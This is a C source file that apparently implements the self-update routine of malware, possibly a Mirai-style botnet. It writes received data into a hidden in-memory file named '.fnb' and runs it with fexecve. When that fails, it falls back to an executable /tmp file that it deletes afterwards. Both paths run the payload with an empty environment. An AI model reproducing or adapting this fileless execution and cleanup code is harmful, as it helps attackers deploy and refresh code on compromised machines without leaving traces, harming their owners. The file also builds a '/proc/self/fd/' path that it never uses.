#define _GNU_SOURCE
#include "update.h"
#include "util.h"
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>

#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif

static int memfd_create_fallback(void)
{
    int fd;
    char name[] = ".fnb";

#if defined(__NR_memfd_create)
    fd = syscall(__NR_memfd_create, name, 0);
    if (fd >= 0) return fd;
#elif defined(SYS_memfd_create)
    fd = syscall(SYS_memfd_create, name, 0);
    if (fd >= 0) return fd;
#endif

    return -1;
}

int update_init(struct update_ctx *ctx, uint32_t total_size)
{
    ctx->total_size = total_size;
    ctx->received = 0;

    // try memfd
    ctx->fd = memfd_create_fallback();
    if (ctx->fd >= 0) {
        ctx->fallback_method = UPDATE_FALLBACK_MEMFD;
        return ctx->fd;
    }

    // fallback: write to /tmp
    ctx->fd = open(UPDATE_PATH_TMP, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (ctx->fd >= 0) {
        ctx->fallback_method = UPDATE_FALLBACK_TMP;
        return ctx->fd;
    }

    return -1;
}

int update_write(struct update_ctx *ctx, const uint8_t *data, uint32_t len)
{
    uint32_t remaining = ctx->total_size - ctx->received;
    if (len > remaining)
        len = remaining;

    int n = write(ctx->fd, data, len);
    if (n > 0)
        ctx->received += n;

    return n;
}

void update_close_clean(struct update_ctx *ctx)
{
    if (ctx->fd >= 0) {
        close(ctx->fd);
        ctx->fd = -1;
    }

    if (ctx->fallback_method == UPDATE_FALLBACK_TMP)
        unlink(UPDATE_PATH_TMP);
}

int update_execute(struct update_ctx *ctx)
{
    int fd = ctx->fd;

    if (fd < 0 || ctx->received < 4)
        return -1;

    // memfd: seek to start and fexecve
    if (ctx->fallback_method == UPDATE_FALLBACK_MEMFD) {
        lseek(fd, 0, SEEK_SET);

        char name[] = ".fnb";
        // fexecve needs a path in /proc/self/fd/
        char proc_path[64];
        util_strcpy(proc_path, "/proc/self/fd/");
        int len = util_strlen(proc_path);
        int n = fd;
        if (n >= 10) {
            proc_path[len] = '0' + (n / 10);
            len++;
            proc_path[len] = '0' + (n % 10);
        } else {
            proc_path[len] = '0' + n;
        }
        len++;
        proc_path[len] = '\0';

        char *argv[] = { name, NULL };
        char *envp[] = { NULL };
        fexecve(fd, argv, envp);
        // if fexecve returns, it failed
    }

    // tmp fallback
    if (ctx->fallback_method == UPDATE_FALLBACK_TMP) {
        close(fd);
        ctx->fd = -1;

        char *argv[] = { UPDATE_PATH_TMP, NULL };
        char *envp[] = { NULL };
        execve(UPDATE_PATH_TMP, argv, envp);
    }

    return -1;
}
